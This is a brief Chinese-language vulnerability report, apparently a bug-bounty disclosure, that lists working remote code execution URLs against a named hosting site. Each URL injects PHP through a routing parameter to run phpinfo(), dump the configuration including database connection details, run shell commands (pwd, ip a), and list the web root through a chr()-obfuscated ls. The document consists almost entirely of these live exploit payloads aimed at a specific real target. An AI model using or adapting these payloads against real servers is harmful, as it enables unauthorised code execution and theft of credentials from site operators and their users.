详细说明：

查看phpinfo

http://idc.qycn.com/index.php?s=/Index/Index/home/id/{${phpinfo()}}



#查看配置信息（包括数据库连接信息）

http://idc.qycn.com/index.php?s=/Index/Index/home/id/${@var_dump(c())}



#查看当前目录

http://idc.qycn.com/index.php?s=/Index/Index/home/id/${@print(`pwd`)}



#查看/var/www/html目录

http://idc.qycn.com/index.php?s=/Index/Index/home/id/${@print(shell_exec(ls.chr(32).chr(45).alh.chr(32).chr(47).chr(118).ar.chr(47).www.chr(47).html))}



#查看服务器网络设置

http://idc.qycn.com/index.php?s=/Index/Index/home/id/${@print(`ip a`)}
